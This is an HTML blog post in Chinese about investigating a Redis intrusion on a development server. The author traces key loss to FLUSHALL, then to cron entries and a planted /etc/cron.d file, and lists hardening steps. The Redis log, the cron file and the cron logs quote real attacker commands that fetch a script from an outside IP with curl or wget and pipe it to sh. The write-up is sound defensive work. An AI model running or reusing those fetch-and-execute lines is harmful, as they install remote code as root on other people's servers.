@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>记一次redis攻击排查 - Z.Q.K</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="记一次redis攻击排查" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/posts/%E8%AE%B0%E4%B8%80%E6%AC%A1redis%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/" />
+<meta property="article:published_time" content="2020-10-15T16:18:14+08:00" />
+<meta property="article:modified_time" content="2020-10-15T16:18:14+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="记一次redis攻击排查"/>
+<meta name="twitter:description" content=""/>
+<script src="https://example.comjs/feather.min.js"></script>
+	
+	
+        <link href="https://example.com/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://example.com/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css" />
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://example.com">Z.Q.K</a>
+	</div>
+	<nav>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">记一次redis攻击排查</h1>
+			<div class="meta">Posted on Oct 15, 2020</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="排查过程">排查过程</h2>
+<ul>
+<li>开发环境redis key反复丢失</li>
+<li>启用aof持久化方式，记录每一个写命令，重启redis服务器</li>
+<li>redis key再次丢失</li>
+<li>查看aof文件内容</li>
+<li>排查导致key被删除的命令，del无，出现flushall</li>
+<li>查看flushall周边命令
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">  $8
+  flushall
+  *3
+  $3
+  set
+  $2
+  r1
+  $51
+
+
+  * * * * * root curl -fsS 94.237.85.89:8080/0|sh
+
+
+  *3
+  $3
+  set
+  $2
+  r2
+  $51
+
+
+  * * * * * root wget -qO- 94.237.85.89:8080/0|sh
+
+
+  *1
+  $8
+  flushall
+</code></pre></div></li>
+<li>外部客户端连接到了redis执行恶意命令，类似于https://github.com/redis/redis/issues/3594</li>
+<li>检查crontab列表
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">crontab -l
+</code></pre></div><p>没发现定时任务，检查<a href="https://manpages.debian.org/stretch/cron/cron.8">cron</a>默认读取的目录文件:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ll /etc/cron.d
+total 12
+-rw-r--r--. 1 root root 128 Mar 31  2016 0hourly
+-rw-------  1 root root 235 Nov  6  2016 sysstat
+-rw-r--r--  1 root root 209 Oct 15 12:35 systemdd
+</code></pre></div><p><code>systemdd</code>这个文件今天更新过</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">REDIS0009�	redis-ver5.0.5�
+redis-bits�@�ctimeч_used-mem��H�
+                                 aof-preamble���r23
+  
+* * * * * root wget -qO- 94.237.85.89:8080/0|sh
+  
+r13
+  
+* * * * * root curl -fsS 94.237.85.89:8080/0|sh
+  
+��D��6-�
+</code></pre></div><p>乱码中看到了熟悉的“面孔”，果断删除文件。</p>
+</li>
+<li>检查crontab日志
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tail -f /var/log/cron
+Oct 15 15:40:01 sophonsitapp13 CROND[648]: (root) CMD (curl -fsS 94.237.85.89:8080/0|sh)
+Oct 15 15:40:01 sophonsitapp13 CROND[647]: (root) CMD (wget -qO- 94.237.85.89:8080/0|sh)
+</code></pre></div><p>还在每分钟执行一次，重启进程：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">systemctl start crond.service
+</code></pre></div></li>
+<li>redis安全加固
+<ul>
+<li>禁用CONFIG、FLUSHDB、FLUSHALL命令</li>
+<li>换用一个陌生端口</li>
+<li>加密码（生产环境服务间通讯均是内网环境，所以无需密码）</li>
+<li>其他参考 <a href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="攻击方式总结">攻击方式总结</h2>
+<ul>
+<li>连接到暴露在公网的redis</li>
+<li>清空数据库</li>
+<li>设置cron文件名称</li>
+<li>设置定时任务
+<ul>
+<li>抓取外网bash脚本并执行</li>
+</ul>
+</li>
+<li>数据库写文件</li>
+<li>清空数据库</li>
+</ul>
+<h2 id="攻击生效的条件">攻击生效的条件</h2>
+<ul>
+<li>以root用户运行redis</li>
+<li>redis暴露公网且无密码</li>
+<li>使用了默认的6379</li>
+<li>允许执行FLUSHALL CONFIG SET SAVE等命令</li>
+</ul>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/111634439">https://zhuanlan.zhihu.com/p/111634439</a></li>
+<li><a href="https://github.com/redis/redis/issues/3594">https://github.com/redis/redis/issues/3594</a></li>
+<li><a href="https://help.aliyun.com/knowledge_detail/37447.html">https://help.aliyun.com/knowledge_detail/37447.html</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/zqkgo" rel="me" title="zqkgo"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © 张乾坤 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
